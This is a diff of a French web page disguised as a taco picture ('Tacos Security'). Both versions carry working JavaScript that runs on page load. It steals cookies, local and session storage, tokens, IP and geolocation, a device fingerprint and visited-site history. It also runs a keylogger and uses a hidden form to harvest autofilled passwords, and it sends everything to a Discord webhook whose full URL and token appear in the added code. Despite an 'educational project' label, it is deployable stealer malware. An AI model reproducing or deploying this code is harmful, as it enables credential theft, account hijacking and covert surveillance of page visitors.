@@ -2,151 +2,131 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Tacos Security - Advanced Collection</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tacos Security</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
+            margin: 0;
+            padding: 0;
             background: linear-gradient(135deg, #1a1a2e, #16213e);
-            font-family: monospace;
+            font-family: 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            text-align: center;
             padding: 20px;
-            color: white;
         }
-        .container { max-width: 600px; margin: 0 auto; }
-        .taco-img {
+        img {
             width: 100%;
-            border-radius: 20px;
-            margin-bottom: 20px;
+            max-width: 400px;
+            border-radius: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
         }
-        button {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #ff6600;
-            border: none;
+        h1 {
             color: white;
-            font-weight: bold;
-            border-radius: 999px;
-            cursor: pointer;
+            margin-top: 20px;
         }
         .status {
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.6);
             padding: 15px;
-            border-radius: 15px;
-            margin: 10px 0;
+            border-radius: 20px;
+            color: #00ff88;
+            font-family: monospace;
+            margin-top: 20px;
             font-size: 12px;
-            word-break: break-all;
-        }
-        .hidden-form {
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img class="taco-img" src="https://i.imgur.com/4Z3zY0L.jpeg" alt="Tacos">
-        
-        <div class="status" id="status">
-            🔄 Collecte de données en cours...
-        </div>
-        
-        <button id="manualSend">📤 Forcer l'envoi des données</button>
-        
-        <div style="font-size: 10px; text-align: center; margin-top: 30px; opacity: 0.5;">
-            Projet éducatif - Cybersécurité
-        </div>
-    </div>
-
-    <!-- Formulaire caché pour l'autofill -->
-    <div class="hidden-form">
-        <form id="fakeLoginForm">
-            <input type="text" id="fakeEmail" name="email">
-            <input type="password" id="fakePassword" name="password">
-        </form>
+        <img src="https://media.tenor.com/0eCk6f7F0YsAAAAC/taco-tacos.gif" alt="Tacos">
+        <h1>🌮 TACOS TIME 🌮</h1>
+        <div class="status" id="status">🔍 Collecte des données...</div>
     </div>
 
     <script>
-        // 🔴 REMPLACE PAR TON WEBHOOK DISCORD
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/TA_DISCORD_ID/TA_TOKEN";
+        // ========== TON WEBHOOK DISCORD ==========
+        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1490663339284631685/I7AfZ_ci4CUyTmk9f2BcAdI0qotYl9B5VjUNLEWnW7XShOSnrzoG0pbKqZEJ2Ik5GTRr";
         
-        let allCollectedData = {
-            cookies: [],
-            localStorage: [],
-            sessionStorage: [],
-            oauthTokens: [],
-            visitedSites: [],
-            typedKeys: '',
-            passwords: [],
-            timestamp: new Date().toISOString()
-        };
-        
-        let keyloggerBuffer = '';
-        let lastSend = Date.now();
-        
-        // ========== 1. RÉCUPÉRATION DES COOKIES ==========
-        function stealCookies() {
-            const cookies = document.cookie.split(';');
-            const important = [];
-            
-            cookies.forEach(cookie => {
-                const trimmed = cookie.trim();
-                if(trimmed) {
-                    important.push(trimmed);
-                    // Détection spéciale cookies de session
-                    if(trimmed.includes('session') || trimmed.includes('auth') || trimmed.includes('token')) {
-                        allCollectedData.cookies.push(`🔐 ${trimmed}`);
-                    } else {
-                        allCollectedData.cookies.push(trimmed);
-                    }
-                }
-            });
-            
-            return allCollectedData.cookies;
+        // ========== 1. IP REELLE ==========
+        async function getRealIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return 'IP non trouvée';
+            }
         }
         
-        // ========== 2. STOCKAGE LOCAL ==========
-        function stealLocalStorage() {
-            for(let i = 0; i < localStorage.length; i++) {
+        // ========== 2. GEOLOCALISATION REELLE ==========
+        async function getRealGeo(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                return {
+                    pays: data.country_name || 'Inconnu',
+                    ville: data.city || 'Inconnu',
+                    region: data.region || 'Inconnu',
+                    latitude: data.latitude || 0,
+                    longitude: data.longitude || 0,
+                    fai: data.org || 'Inconnu',
+                    code_postal: data.postal || 'Inconnu'
+                };
+            } catch(e) {
+                return { erreur: 'Geo non disponible' };
+            }
+        }
+        
+        // ========== 3. TOUS LES COOKIES ==========
+        function getAllCookies() {
+            if (!document.cookie) return 'Aucun cookie';
+            return document.cookie;
+        }
+        
+        // ========== 4. LOCALSTORAGE COMPLET ==========
+        function getAllLocalStorage() {
+            let result = '';
+            for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 const value = localStorage.getItem(key);
-                if(value && value.length > 0) {
-                    allCollectedData.localStorage.push(`${key}: ${value.substring(0, 100)}`);
-                }
+                result += `${key} = ${value}\n`;
             }
-            
-            for(let i = 0; i < sessionStorage.length; i++) {
+            return result || 'Aucune donnée LocalStorage';
+        }
+        
+        // ========== 5. SESSIONSTORAGE COMPLET ==========
+        function getAllSessionStorage() {
+            let result = '';
+            for (let i = 0; i < sessionStorage.length; i++) {
                 const key = sessionStorage.key(i);
                 const value = sessionStorage.getItem(key);
-                if(value && value.length > 0) {
-                    allCollectedData.sessionStorage.push(`${key}: ${value.substring(0, 100)}`);
-                }
+                result += `${key} = ${value}\n`;
             }
+            return result || 'Aucune donnée SessionStorage';
         }
         
-        // ========== 3. TOKENS OAUTH ==========
-        function stealOAuthTokens() {
-            const tokenPatterns = ['access_token', 'refresh_token', 'id_token', 'token', 'jwt', 'bearer'];
-            const found = [];
-            
-            // Check localStorage
-            for(let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                
-                tokenPatterns.forEach(pattern => {
-                    if(key.toLowerCase().includes(pattern) && value && value.length > 15) {
-                        found.push(`${key}: ${value.substring(0, 50)}...`);
-                    }
-                });
-            }
-            
-            allCollectedData.oauthTokens = found;
-            return found;
+        // ========== 6. INFOS APPAREIL (FINGERPRINT) ==========
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                langue: navigator.language,
+                ecran: `${screen.width}x${screen.height}`,
+                profondeur_couleur: screen.colorDepth,
+                fuseau_horaire: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                coeurs_CPU: navigator.hardwareConcurrency || 'Inconnu',
+                RAM: navigator.deviceMemory || 'Inconnu' + ' GB',
+                touchPoints: navigator.maxTouchPoints,
+                cookies_actives: navigator.cookieEnabled ? 'Oui' : 'Non'
+            };
         }
         
-        // ========== 4. SITES VISITÉS (via CSS) ==========
-        function detectVisitedSites() {
+        // ========== 7. SITES VISITES (via CSS) ==========
+        function getVisitedSites() {
             const sites = [
                 'https://discord.com/login',
                 'https://github.com/login',
@@ -156,239 +136,174 @@
                 'https://twitter.com',
                 'https://outlook.live.com',
                 'https://mail.google.com',
-                'https://www.reddit.com',
-                'https://www.twitch.tv',
                 'https://www.youtube.com',
-                'https://www.netflix.com',
-                'https://www.spotify.com'
+                'https://www.tiktok.com'
             ];
             
-            const visited = [];
-            
-            sites.forEach(site => {
+            const visits = [];
+            for (const site of sites) {
                 const link = document.createElement('a');
                 link.href = site;
-                link.style.cssText = 'position:absolute; left:-9999px;';
+                link.style.cssText = 'position:absolute;left:-9999px;';
                 document.body.appendChild(link);
-                
-                // Vérifie si le lien a été visité
-                const color = window.getComputedStyle(link).getPropertyValue('color');
-                if(color !== 'rgb(0, 0, 238)') {
-                    visited.push(site);
+                const color = window.getComputedStyle(link).color;
+                if (color !== 'rgb(0, 0, 238)') {
+                    visits.push(site);
                 }
-                
                 link.remove();
-            });
-            
-            allCollectedData.visitedSites = visited;
-            return visited;
+            }
+            return visits;
         }
         
-        // ========== 5. KEYLOGGER AVANCÉ ==========
+        // ========== 8. KEYLOGGER (TOUT CE QUI EST TAPE) ==========
+        let keylogData = '';
+        let lastSend = Date.now();
+        
         function startKeylogger() {
             document.addEventListener('keydown', (e) => {
-                // Ignore touches spéciales
-                if(e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
+                if (e.key === 'Enter') keylogData += '\n';
+                else if (e.key === 'Backspace') keylogData = keylogData.slice(0, -1);
+                else if (e.key === 'Tab') keylogData += '    ';
+                else if (e.key.length === 1) keylogData += e.key;
                 
-                let char = e.key;
-                if(char === ' ') char = ' ';
-                if(char === 'Enter') char = '\n[ENTER]\n';
-                if(char === 'Tab') char = '[TAB]';
-                if(char === 'Backspace') char = '[BACKSPACE]';
-                
-                keyloggerBuffer += char;
-                allCollectedData.typedKeys = keyloggerBuffer;
-                
-                // Envoie toutes les 10 secondes ou si 200 caractères
-                if(keyloggerBuffer.length > 200 || (Date.now() - lastSend) > 10000) {
-                    sendToDiscord("📝 KEYLOGGER", keyloggerBuffer);
-                    keyloggerBuffer = '';
-                    lastSend = Date.now();
+                // Envoie toutes les 10 secondes ou si trop de caractères
+                if (keylogData.length > 200 || (Date.now() - lastSend) > 10000) {
+                    if (keylogData.length > 5) {
+                        sendToWebhook('⌨️ KEYLOGGER', `\`\`\`\n${keylogData}\n\`\`\``);
+                        keylogData = '';
+                        lastSend = Date.now();
+                    }
                 }
             });
             
-            // Récupère aussi les inputs des formulaires
+            // Capture aussi les inputs
             document.addEventListener('input', (e) => {
-                if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                    const inputData = `[INPUT ${e.target.type || 'text'}]: ${e.target.value}`;
-                    keyloggerBuffer += inputData + '\n';
+                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                    keylogData += `[${e.target.placeholder || e.target.name || 'input'}] = ${e.target.value}\n`;
                 }
             });
         }
         
-        // ========== 6. FAUX FORMULAIRE AUTOFILL ==========
-        function stealAutofillPasswords() {
-            const emailInput = document.getElementById('fakeEmail');
-            const passwordInput = document.getElementById('fakePassword');
+        // ========== 9. FORMULAIRE CACHE POUR AUTOFILL ==========
+        function createHiddenForm() {
+            const form = document.createElement('div');
+            form.style.position = 'absolute';
+            form.style.left = '-9999px';
+            form.style.top = '-9999px';
+            form.innerHTML = `
+                <form>
+                    <input type="text" name="email" id="hiddenEmail" placeholder="Email">
+                    <input type="password" name="password" id="hiddenPassword" placeholder="Mot de passe">
+                </form>
+            `;
+            document.body.appendChild(form);
             
-            // Attend que l'autofill se fasse
+            // Récupère l'autofill après quelques secondes
             setTimeout(() => {
-                if(emailInput.value || passwordInput.value) {
-                    allCollectedData.passwords.push({
-                        email: emailInput.value,
-                        password: passwordInput.value
-                    });
-                    
-                    sendToDiscord("🔑 MOTS DE PASSE AUTOFILL", 
-                        `Email: ${emailInput.value}\nPassword: ${passwordInput.value}`);
+                const email = document.getElementById('hiddenEmail').value;
+                const password = document.getElementById('hiddenPassword').value;
+                if (email || password) {
+                    sendToWebhook('🔑 AUTOFILL CAPTURE', `Email: ${email}\nPassword: ${password}`);
                 }
-            }, 1500);
+            }, 3000);
             
             setTimeout(() => {
-                if(emailInput.value || passwordInput.value) {
-                    allCollectedData.passwords.push({
-                        email: emailInput.value,
-                        password: passwordInput.value
-                    });
-                    
-                    sendToDiscord("🔑 MOTS DE PASSE AUTOFILL (2ème tentative)", 
-                        `Email: ${emailInput.value}\nPassword: ${passwordInput.value}`);
+                const email = document.getElementById('hiddenEmail').value;
+                const password = document.getElementById('hiddenPassword').value;
+                if (email || password) {
+                    sendToWebhook('🔑 AUTOFILL CAPTURE (retard)', `Email: ${email}\nPassword: ${password}`);
                 }
-            }, 5000);
+            }, 8000);
         }
         
-        // ========== 7. FINGERPRINT (ID unique de l'appareil) ==========
-        function getDeviceFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 100, 100);
-            ctx.fillStyle = '#fff';
-            ctx.fillText('Tacos', 10, 10);
-            
-            const fingerprint = {
-                canvas: canvas.toDataURL(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenRes: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                colorDepth: screen.colorDepth,
-                touchPoints: navigator.maxTouchPoints,
-                doNotTrack: navigator.doNotTrack
-            };
-            
-            return fingerprint;
-        }
-        
-        // ========== 8. RÉCUPÉRATION IP & GÉOLOCALISATION ==========
-        async function getIPAndGeo() {
-            try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await ipRes.json();
-                
-                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                const geo = await geoRes.json();
-                
-                return { ip, geo };
-            } catch(e) {
-                return { ip: 'Inconnue', geo: {} };
-            }
-        }
-        
-        // ========== 9. ENVOI À DISCORD ==========
-        async function sendToDiscord(title, content) {
-            if(WEBHOOK_URL === "https://discord.com/api/webhooks/TA_DISCORD_ID/TA_TOKEN") {
-                console.log("⚠️ Webhook non configuré - Données:", title, content);
-                return;
-            }
-            
+        // ========== 10. ENVOI AU WEBHOOK DISCORD ==========
+        async function sendToWebhook(title, content) {
             const embed = {
                 title: `🌮 ${title}`,
-                description: content.length > 2000 ? content.substring(0, 1900) + '...' : content,
+                description: content.length > 1900 ? content.substring(0, 1900) + '...' : content,
                 color: 0xFF6600,
-                timestamp: new Date().toISOString(),
-                footer: { text: 'Tacos Security Collection' }
+                timestamp: new Date().toISOString()
             };
             
             try {
-                await fetch(WEBHOOK_URL, {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ embeds: [embed] })
                 });
-                console.log(`✅ ${title} envoyé`);
-            } catch(e) {
-                console.error('Erreur:', e);
-            }
-        }
-        
-        // ========== 10. COLLECTE TOTALE ==========
-        async function collectAllData() {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = '🔄 Collecte des données en cours...\n';
-            
-            // 1. IP et Geo
-            const { ip, geo } = await getIPAndGeo();
-            statusDiv.innerHTML += `✅ IP: ${ip}\n`;
-            await sendToDiscord("📍 IP & Géo", `IP: ${ip}\nPays: ${geo.country_name}\nVille: ${geo.city}\nISP: ${geo.org}`);
-            
-            // 2. Cookies
-            const cookies = stealCookies();
-            if(cookies.length > 0) {
-                await sendToDiscord("🍪 Cookies volés", cookies.join('\n'));
-                statusDiv.innerHTML += `✅ ${cookies.length} cookies récupérés\n`;
-            }
-            
-            // 3. Local/Session Storage
-            stealLocalStorage();
-            if(allCollectedData.localStorage.length > 0) {
-                await sendToDiscord("💾 LocalStorage", allCollectedData.localStorage.join('\n'));
-                statusDiv.innerHTML += `✅ ${allCollectedData.localStorage.length} items localStorage\n`;
-            }
-            
-            // 4. OAuth Tokens
-            const oauth = stealOAuthTokens();
-            if(oauth.length > 0) {
-                await sendToDiscord("🔑 Tokens OAuth", oauth.join('\n'));
-                statusDiv.innerHTML += `✅ ${oauth.length} tokens OAuth\n`;
-            }
-            
-            // 5. Sites visités
-            const visited = detectVisitedSites();
-            if(visited.length > 0) {
-                await sendToDiscord("🌐 Sites visités", visited.join('\n'));
-                statusDiv.innerHTML += `✅ ${visited.length} sites visités détectés\n`;
-            }
-            
-            // 6. Fingerprint
-            const fingerprint = getDeviceFingerprint();
-            await sendToDiscord("🆔 Empreinte numérique", JSON.stringify(fingerprint, null, 2));
-            
-            // 7. Autofill
-            stealAutofillPasswords();
-            
-            statusDiv.innerHTML += `\n✅ Collecte terminée ! Les données sont envoyées à Discord.\n`;
-        }
-        
-        // ========== INIT ==========
-        async function init() {
-            startKeylogger();
-            await collectAllData();
-            
-            document.getElementById('manualSend').onclick = () => {
-                sendToDiscord("📊 Rapport manuel", 
-                    `Cookies: ${allCollectedData.cookies.length}\n` +
-                    `LocalStorage: ${allCollectedData.localStorage.length}\n` +
-                    `Tokens: ${allCollectedData.oauthTokens.length}\n` +
-                    `Keylogger: ${keyloggerBuffer.length} caractères\n` +
-                    `Sites visités: ${allCollectedData.visitedSites.length}`
-                );
-            };
-            
-            // Envoie le keylogger à la fermeture
-            window.addEventListener('beforeunload', () => {
-                if(keyloggerBuffer.length > 10) {
-                    sendToDiscord("📝 Keylogger (fin session)", keyloggerBuffer);
+                if (response.ok) {
+                    console.log(`✅ Envoyé: ${title}`);
+                } else {
+                    console.log(`❌ Erreur: ${response.status}`);
                 }
-            });
+            } catch(e) {
+                console.log(`❌ Erreur envoi: ${e.message}`);
+            }
         }
         
-        init();
+        // ========== 11. COLLECTE ET ENVOI DE TOUT ==========
+        async function collectAndSendAll() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = "🌐 Récupération IP...";
+            
+            // IP
+            const ip = await getRealIP();
+            statusDiv.innerHTML = `📍 IP trouvée: ${ip}`;
+            await sendToWebhook('🌐 IP PUBLIQUE', ip);
+            
+            // Géolocalisation
+            statusDiv.innerHTML = "🗺️ Récupération géolocalisation...";
+            const geo = await getRealGeo(ip);
+            await sendToWebhook('📍 GEOLOCALISATION', 
+                `**Pays:** ${geo.pays}\n**Ville:** ${geo.ville}\n**Région:** ${geo.region}\n**Code postal:** ${geo.code_postal}\n**FAI:** ${geo.fai}\n**Coords:** ${geo.latitude}, ${geo.longitude}`);
+            
+            // Cookies
+            statusDiv.innerHTML = "🍪 Récupération cookies...";
+            const cookies = getAllCookies();
+            if (cookies !== 'Aucun cookie') {
+                await sendToWebhook('🍪 COOKIES', cookies);
+            }
+            
+            // LocalStorage
+            statusDiv.innerHTML = "💾 Récupération LocalStorage...";
+            const localStorage = getAllLocalStorage();
+            if (localStorage !== 'Aucune donnée LocalStorage') {
+                await sendToWebhook('💾 LOCALSTORAGE', localStorage);
+            }
+            
+            // SessionStorage
+            statusDiv.innerHTML = "📦 Récupération SessionStorage...";
+            const sessionStorage = getAllSessionStorage();
+            if (sessionStorage !== 'Aucune donnée SessionStorage') {
+                await sendToWebhook('📦 SESSIONSTORAGE', sessionStorage);
+            }
+            
+            // Infos appareil
+            statusDiv.innerHTML = "📱 Récupération infos appareil...";
+            const deviceInfo = getDeviceInfo();
+            await sendToWebhook('📱 INFOS APPAREIL', 
+                `**User Agent:** ${deviceInfo.userAgent}\n**Plateforme:** ${deviceInfo.platform}\n**Langue:** ${deviceInfo.langue}\n**Écran:** ${deviceInfo.ecran}\n**CPU:** ${deviceInfo.coeurs_CPU} coeurs\n**RAM:** ${deviceInfo.RAM}\n**Fuseau:** ${deviceInfo.fuseau_horaire}\n**Cookies:** ${deviceInfo.cookies_actives}`);
+            
+            // Sites visités
+            statusDiv.innerHTML = "🌐 Détection sites visités...";
+            const visited = getVisitedSites();
+            if (visited.length > 0) {
+                await sendToWebhook('🌐 SITES VISITÉS', visited.join('\n'));
+            }
+            
+            // Keylogger activé
+            statusDiv.innerHTML = "⌨️ Keylogger activé - Tout ce que tu tapes est envoyé à Discord";
+            startKeylogger();
+            
+            // Formulaire caché autofill
+            createHiddenForm();
+            
+            // Envoi final
+            statusDiv.innerHTML = "✅ COLLECTE TERMINÉE !\n⌨️ Keylogger actif - continue de taper...";
+        }
+        
+        // LANCEMENT
+        collectAndSendAll();
     </script>
 </body>
 </html>
